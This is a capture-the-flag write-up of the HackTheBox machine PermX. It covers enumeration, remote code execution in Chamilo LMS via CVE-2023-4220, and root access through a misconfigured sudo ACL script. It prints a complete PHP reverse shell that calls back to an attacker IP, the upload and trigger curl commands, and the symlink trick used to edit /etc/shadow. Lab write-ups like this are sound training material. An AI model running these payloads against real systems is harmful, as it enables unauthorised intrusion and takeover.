---
title: "HackTheBox: PermX"
description: "Guia completa para la enumeracion y posterior explotacion de la maquina PermX de HackTheBox"
date: 2024-18-06
creator: "mtzsec"
rating: 4.6
dificultad: "Facil"
author: "Ghxstsec"
draft: false
type: "post"
---

PermX Write-up Hack The Box
===========================

Welcome to the best writeup for PermX (just kidding)

Let’s start:
------------

First, we are going to start with enumeration.

### ENUMERATION

```
nmap -sC -sV -v 10.129.42.112        
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-07 09:37 IST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 09:37
Completed NSE at 09:37, 0.00s elapsed
Initiating NSE at 09:37
Completed NSE at 09:37, 0.00s elapsed
Initiating NSE at 09:37
Completed NSE at 09:37, 0.00s elapsed
Initiating Ping Scan at 09:37
Scanning 10.129.42.112 [2 ports]
Completed Ping Scan at 09:37, 0.21s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 09:37
Completed Parallel DNS resolution of 1 host. at 09:37, 0.03s elapsed
Initiating Connect Scan at 09:37
Scanning 10.129.42.112 [1000 ports]
Discovered open port 22/tcp on 10.129.42.112
Discovered open port 80/tcp on 10.129.42.112
Completed Connect Scan at 09:37, 16.23s elapsed (1000 total ports)
Initiating Service scan at 09:37
Scanning 2 services on 10.129.42.112
Completed Service scan at 09:37, 6.81s elapsed (2 services on 1 host)
NSE: Script scanning 10.129.42.112.
Initiating NSE at 09:37
Completed NSE at 09:37, 6.37s elapsed
Initiating NSE at 09:37
Completed NSE at 09:37, 0.93s elapsed
Initiating NSE at 09:37
Completed NSE at 09:37, 0.03s elapsed
Nmap scan report for 10.129.42.112
Host is up (0.22s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://permx.htb
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
NSE: Script Post-scanning.
Initiating NSE at 09:37
Completed NSE at 09:37, 0.01s elapsed
Initiating NSE at 09:37
Completed NSE at 09:37, 0.00s elapsed
Initiating NSE at 09:37
Completed NSE at 09:37, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.54 seconds
```

we have a http port open, lets see the site hosted in it. if you can’t acces it add it to /etc/hosts

```
sudo nano /etc/hosts
10.10.11.23       permx.htb
```

![http://permx.htb/ landing page](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NnIm41wtMRhz_QV8bU-hVg.png)


Nothing interesting, let’s do some directory fuzzing to see some hidden hints, for this i am using gobuster, you can also use ffuf or wfuzz

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WGF0CDcYgnTmOfiaBbs-PA.png)

Nothing interesting lets enumerate the subdomains with wfuzz

```
wfuzz -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://permx.htb/ -H 'Host:FUZZ.permx.htb' -t 50 --hc 302
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************
Target: http://permx.htb/
Total requests: 19966
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                               
=====================================================================
000000001:   200        586 L    2466 W     36182 Ch    "www"                                                 
000000477:   200        352 L    940 W      19347 Ch    "lms"                                                 
000009532:   400        10 L     35 W       301 Ch      "#www"                                                
000010581:   400        10 L     35 W       301 Ch      "#mail"                                               
Total time: 142.2269
Processed Requests: 19966
Filtered Requests: 19962
Requests/sec.: 140.3812
```

we are able to get two subdomains, interesting, let’s see what lms hosts

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qJXKGokMSo8ijqoEROj-zw.png)

WOW, a login panel, what a surprise actually, let’s see what version is this service running with whatweb

```
whatweb lms.permx.htb
http://lms.permx.htb [200 OK] Apache[2.4.52], Bootstrap, Chamilo[1], Cookies[GotoCourse,ch_sid], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], HttpOnly[GotoCourse,ch_sid], IP[10.129.42.112], JQuery, MetaGenerator[Chamilo 1], Modernizr, PasswordField[password], PoweredBy[Chamilo], Script, Title[PermX - LMS - Portal], X-Powered-By[Chamilo 1], X-UA-Compatible[IE=edge]
```

EXPLOITATION
------------

Well, it’s chamilo, tbh i have never exploited this, btw, searching in the internet i could find a CVE:

[(CVE-2023–4220) Chamilo LMS Unauthenticated Big Upload File Remote Code Execution | STAR Labs](https://starlabs.sg/advisories/23/23-4220/)

mmm, let’s get our reverse shells out the pocket

```
echo '<?php system("id"); ?>' > rce.php
curl -F 'bigUploadFile=@rce.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rce.php'
```

Now, the old but functional pentestmonkey php reverse shell, REMEMBER TO CHANGE YOUR IP AND PORT

```
<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.15.61';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
if (function_exists('pcntl_fork')) {
 // Fork and have the parent process exit
 $pid = pcntl_fork();
 
 if ($pid == -1) {
  printit("ERROR: Can't fork");
  exit(1);
 }
 
 if ($pid) {
  exit(0);  // Parent exits
 }
 // Make the current process a session leader
 // Will only succeed if we forked
 if (posix_setsid() == -1) {
  printit("Error: Can't setsid()");
  exit(1);
 }
 $daemon = 1;
} else {
 printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}
// Change to a safe directory
chdir("/");
// Remove any umask we inherited
umask(0);
//
// Do the reverse shell...
//
// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
 printit("$errstr ($errno)");
 exit(1);
}
// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);
$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) {
 printit("ERROR: Can't spawn shell");
 exit(1);
}
// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
printit("Successfully opened reverse shell to $ip:$port");
while (1) {
 // Check for end of TCP connection
 if (feof($sock)) {
  printit("ERROR: Shell connection terminated");
  break;
 }
 // Check for end of STDOUT
 if (feof($pipes[1])) {
  printit("ERROR: Shell process terminated");
  break;
 }
 // Wait until a command is end down $sock, or some
 // command output is available on STDOUT or STDERR
 $read_a = array($sock, $pipes[1], $pipes[2]);
 $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
 // If we can read from the TCP socket, send
 // data to process's STDIN
 if (in_array($sock, $read_a)) {
  if ($debug) printit("SOCK READ");
  $input = fread($sock, $chunk_size);
  if ($debug) printit("SOCK: $input");
  fwrite($pipes[0], $input);
 }
 // If we can read from the process's STDOUT
 // send data down tcp connection
 if (in_array($pipes[1], $read_a)) {
  if ($debug) printit("STDOUT READ");
  $input = fread($pipes[1], $chunk_size);
  if ($debug) printit("STDOUT: $input");
  fwrite($sock, $input);
 }
 // If we can read from the process's STDERR
 // send data down tcp connection
 if (in_array($pipes[2], $read_a)) {
  if ($debug) printit("STDERR READ");
  $input = fread($pipes[2], $chunk_size);
  if ($debug) printit("STDERR: $input");
  fwrite($sock, $input);
 }
}
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
 if (!$daemon) {
  print "$string\n";
 }
}
?>
```

we upload the script (rce.php) open a netcat (nc -nlvp 4444) and execute it with this commands

```
nano rce.php # Copy and paste the reverse shell that i gave you and change the ip and port options.
curl -F 'bigUploadFile=@rce.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
nc -nlvp 4444
curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rce.php'
``````

```
nc -lnvp 4444  
listening on [any] 4444 ...
connect to [10.10.14.42] from (UNKNOWN) [10.129.42.112] 35954
Linux permx 5.15.0-113-generic #123-Ubuntu SMP Mon Jun 10 08:16:17 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 04:34:35 up  4:29,  0 users,  load average: 0.00, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$
```

i take a look at /home/ directory, which has a mtz folder, so a mtz user is hosted in the machine. We catch the shell, now after some enumeration you can get a config file at /var/www/chamilo/app/config/configuration.php

```
// Database connection settings.
$_configuration['db_host'] = 'localhost';
$_configuration['db_port'] = '3306';
$_configuration['main_database'] = 'chamilo';
$_configuration['db_user'] = 'chamilo';
$_configuration['db_password'] = '03*********W8';
// Enable access to database management for platform admins.
$_configuration['db_manager_enabled'] = false;
```

and we have the database credentials, sowhen you have a password you have to try it in every login you can, so let´s try it with mtz.

we connect via ssh to mtz@10.10.11.23

aaaand abracadabra

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*nxJv7KNPKVap4sZxaZdn_w.png)

If you arrived to this point, you already have the user flag!

PRIVILEGE ESCALATION
--------------------

First thing that i do at every CTF, check sudo -l command to see if we have some sudo privileges.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0YSNftZxWuYNCyp6o3Gemg.png)

we are able to run as sudo the /opt/acl.sh bash script, let’s see what it is

![captionless image](https://miro.medium.com/v2/resize:fit:1168/format:webp/1*hTPqmlucu38yJ4O4iB7Png.png)

oh, this script is made to change permissions, let’s do something like this:

```
 ln -s / root ## symbolic link
 sudo /opt/acl.sh mtz rwx /home/mtz/root/etc/shadow ## change the permissions
 nano /etc/shadow ## get the hashes
```

now, when we have access to the hashes, copy the mtz one and paste it in the root one and we will login with the same password used before

```
mtz@permx:~$ su root
Password: 
root@permx:/home/mtz# ls
root  user.txt
root@permx:/home/mtz# cd root
root@permx:/home/mtz/root# ls
bin  boot  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
root@permx:/home/mtz/root# cd root
root@permx:/home/mtz/root/root# ls
backup  reset.sh  root.txt
root@permx:/home/mtz/root/root# cat root.txt
```

Thank you for watching, and Happy Hacking 😀

```
👋 Sobre el autor

¡Hola! Soy Ghxstsec, un entusiasta de la ciberseguridad y pentester. Me dedico a documentar mi viaje por el complejo mundo de la seguridad ofensiva.

Actualmente, poseo las certificaciones eJPTv2, eCPPTv3 y Google Cybersecurity Professional Certificate. Mi objetivo es intentar ayudar a sobrellevar la brecha entre el aprendizaje teórico y la práctica, al tiempo que comparto mis experiencias sinceras con la comunidad. Cuando no estoy en una maratón de exámenes de 24 horas, me puedes encontrar haciendo ejercicios en Try Hack Me o investigando los últimos artículos sobre ciberseguridad.

✉️ Conéctate conmigo:

LinkedIn: [LinkedIn](https://www.linkedin.com/in/joel-morillas-aka-ghxstsec-16a988260/)
GitHub: [GitHub](https://github.com/Ghxstsec)
Twitter/X: [Twitter](https://x.com/Louikizz)
Try Hack Me: [THM](https://tryhackme.com/p/Ghxstsec)

¡Muchas gracias por leer todo el artículo! ¡Te deseo mucha suerte en tus próximos logros! 😊
